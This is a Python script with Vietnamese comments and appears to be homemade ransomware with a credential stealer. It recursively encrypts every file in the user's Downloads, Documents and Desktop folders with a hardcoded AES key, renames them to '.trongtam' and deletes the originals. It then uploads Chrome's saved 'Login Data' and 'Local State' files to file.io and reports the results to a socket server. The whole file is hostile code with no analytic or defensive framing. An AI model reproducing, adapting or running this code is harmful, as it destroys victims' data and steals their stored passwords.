from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import requests
import socket
# Đặt địa chỉ máy chủ và cổng
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('127.0.0.1', 12345)  # Địa chỉ và cổng của server

# Kết nối đến máy chủ
client_socket.connect(server_address)
# Lấy tên người dùng
user_name = os.getlogin()


# Hàm mã hóa một tệp
def encrypt_file(key, filename):
    chunk_size = 64 * 1024  # 64 KB
    output_filename = filename + ".trongtam"

    # Tạo iv ngẫu nhiên
    iv = get_random_bytes(16)

    # Tạo đối tượng AES
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Mở file gốc và file mã hóa
    with open(filename, "rb") as infile:
        with open(output_filename, "wb") as outfile:
            # Ghi iv vào file mã hóa
            outfile.write(iv)

            # Mã hóa từng chunk của dữ liệu và ghi vào file mã hóa
            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    # Thêm padding nếu cần thiết
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(cipher.encrypt(chunk))

    # Xóa file gốc sau khi đã mã hóa
    os.remove(filename)

# Hàm mã hóa tất cả các tệp trong thư mục và thư mục con
def encrypt_folder_recursive(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for filename in files:
            filepath = os.path.join(root, filename)
            encrypt_file(key, filepath)



# Đường dẫn đến các thư mục
download_folder_path = os.path.join("C:\\Users", user_name, "Downloads")
document_folder_path = os.path.join("C:\\Users", user_name, "Documents")
desktop_folder_path = os.path.join("C:\\Users", user_name, "Desktop")

# Khóa mã hóa
key = b'trongtamtrongtam1234567890123456'

# Mã hóa các tệp trong các thư mục
encrypt_folder_recursive(download_folder_path, key)
encrypt_folder_recursive(document_folder_path, key)
encrypt_folder_recursive(desktop_folder_path, key)
def upload_file(filename):
    with open(filename, 'rb') as file:
        response = requests.post('https://file.io', files={'file': file})
        if response.status_code == 200:
            #print("Upload thành công!")
            data  =  response.json()
            client_socket.send(data.encode())

        else:
            #print("Upload thất bại. Mã trạng thái:", response.status_code)
            return None
file_path_LG = f'C:\\Users\\{user_name}\\AppData\\Local\Google\\Chrome\\User Data\\Default\\Login Data'
file_path_LS = f'C:\\Users\\{user_name}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'

result = upload_file(file_path_LG)
#print(result)
result = upload_file(file_path_LS)
#print(result)
